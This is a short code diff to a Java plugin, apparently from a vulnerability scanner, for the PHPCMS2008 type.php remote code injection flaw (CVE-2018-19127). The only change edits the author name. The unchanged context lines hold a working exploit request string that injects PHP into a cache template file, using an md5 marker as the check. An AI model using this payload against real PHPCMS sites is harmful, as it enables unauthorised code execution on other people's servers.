@@ -12,7 +12,7 @@ import java.util.Map;
 @Plugin(title = "PHPCMS2008 type.php远程代码注入漏洞（CVE-2018-19127）",
         desc = "CVE-2018-19127",
         link = "http://sec.sangfor.com.cn/events/178.html",
-        author = "blue" )
+        author = "浅蓝" )
 public class PHPcms2008rce extends CommonPlugin<String> {
     String verify = "/data/cache_template/print.tpl.php";
     String exp = "/type.php?template=tag_($s,$b){$s=1;}@var_dump(md5(233));{//../print";
